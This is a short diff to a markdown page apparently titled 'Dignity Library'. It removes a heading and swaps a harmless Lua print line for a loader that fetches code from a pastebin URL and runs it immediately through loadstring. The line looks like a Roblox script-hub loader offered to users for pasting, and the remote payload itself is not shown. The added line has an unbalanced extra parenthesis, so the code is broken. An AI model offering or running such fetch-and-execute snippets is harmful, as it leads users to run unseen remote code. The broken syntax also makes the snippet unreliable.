@@ -2,13 +2,8 @@
 layout: default
 title: Dignity Library
 ---
-
-# Diginity Library
-
-* * *
-
 ```lua
-print("none")
+loadstring(game:HttpGet"https://pastebin.com/raw/nciNWESt"))()
 ```
 
 * * *
